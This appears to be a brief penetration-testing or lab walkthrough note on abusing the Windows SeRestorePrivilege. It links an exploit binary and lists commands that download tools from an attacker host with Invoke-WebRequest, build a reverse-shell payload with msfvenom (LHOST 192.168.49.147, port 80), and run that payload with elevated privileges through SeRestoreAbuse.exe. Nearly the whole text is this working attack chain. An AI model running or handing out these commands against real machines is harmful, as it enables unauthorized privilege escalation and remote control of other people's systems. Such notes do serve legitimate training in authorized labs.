# SeRestorePrivilege

SeRestorePrivilege - Enabled

[https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe](https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe)

```
PS C:\Users\svc_apache$\Documents> Invoke-WebRequest -Uri http://192.168.49.147/SeRestoreAbuse.exe -OutFile SeRestoreAbuse.exe
```

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.147 LPORT=80 -f exe -o shell.exe
```

```
PS C:\Users\svc_apache$\Documents> Invoke-WebRequest -Uri http://192.168.49.147/shell.exe -OutFile shell.exe

PS C:\Users\svc_apache$\Documents> .\SeRestoreAbuse.exe "cmd /c \Users\svc_apache$\Documents\shell.exe"
```
